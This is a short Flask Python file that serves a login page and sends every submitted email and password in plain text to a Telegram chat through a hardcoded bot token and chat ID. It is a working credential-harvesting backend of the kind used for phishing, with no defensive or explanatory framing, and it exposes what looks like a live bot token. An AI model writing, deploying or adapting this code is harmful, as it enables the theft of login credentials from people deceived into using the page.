from flask import Flask, render_template, request, redirect, url_for, flas
from telegram import Bot

app = Flask(__name__)
app.secret_key = ''

# Telegram bot setup
TELEGRAM_TOKEN = '7357492187:AAGQfwOkjcJ5N5NLw6BW9jTcLZpSaBrTy8I'
CHAT_ID = '-4213956034'
bot = Bot(token=TELEGRAM_TOKEN)


@app.route('/')
def login():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def do_login():
    email = request.form.get('email')
    password = request.form.get('password')

    # Send login data to Telegram chat
    message = f'Login attempt:\nEmail: {email}\nPassword: {password}'
    bot.send_message(chat_id=CHAT_ID, text=message)

    flash('Login data sent to Telegram chat.')
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(debug=True)

